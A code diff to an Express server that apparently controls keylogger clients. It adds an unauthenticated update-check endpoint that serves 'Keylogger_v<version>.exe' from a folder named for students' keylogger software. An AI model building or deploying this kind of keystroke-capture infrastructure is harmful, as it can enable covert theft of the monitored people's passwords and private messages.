@@ -215,7 +215,7 @@ app.use(cors());
 app.use(express.json());
 
 function authMiddleware(req, res, next) {
-    const allowedPaths = ['/login', '/login.html', '/api/login'];
+    const allowedPaths = ['/login', '/login.html', '/api/login', '/api/update/check'];
     if (allowedPaths.includes(req.path)) {
         return next();
     }
@@ -1230,9 +1230,27 @@ function handleWebSocketConnection(ws, req) {
     });
 }
 
+// 更新检查配置
+const UPDATE_CONFIG = {
+    version: process.env.UPDATE_VERSION || '1.0.1',
+    downloadBaseUrl: process.env.UPDATE_DOWNLOAD_BASE_URL || `${CONFIG.alist.url}/学生目录/软件/键盘记录器`
+};
+
 // HTTP API
 app.get('/api/clients', (req, res) => {
     res.json(clientManager.getAllClients());
+});
+
+app.get('/api/update/check', (req, res) => {
+    const downloadUrl = `${UPDATE_CONFIG.downloadBaseUrl}/Keylogger_v${UPDATE_CONFIG.version}.exe`;
+    
+    res.json({
+        code: 200,
+        data: {
+            version: UPDATE_CONFIG.version,
+            download_url: downloadUrl
+        }
+    });
 });
 
 app.get('/api/logs', asyncHandler(async (req, res) => {
